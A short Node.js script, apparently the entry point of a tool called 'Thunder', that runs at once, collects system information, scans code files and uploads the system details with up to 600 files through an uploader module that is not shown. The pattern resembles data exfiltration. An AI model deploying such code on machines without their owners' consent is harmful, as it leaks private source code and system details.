const getSystemInfo = require("./systemInfo");
const scanCodeFiles = require("./scanner");


const uploadPayload = require("./uploader");

async function runThunder() {
  try {
    console.log("Starting Thunder...");

    console.log("Collecting system info...");
    const systemInfo = getSystemInfo();

    console.log("Scanning files...");
    const files = scanCodeFiles();


    console.log("Uploading...");
    // const response = await uploadPayload(systemInfo, files);
     await uploadPayload(systemInfo, files.slice(0, 600));
    console.log("Upload complete.");
  } catch (error) {
    console.error("Thunder failed:", error.message || error);
  }
}

runThunder();
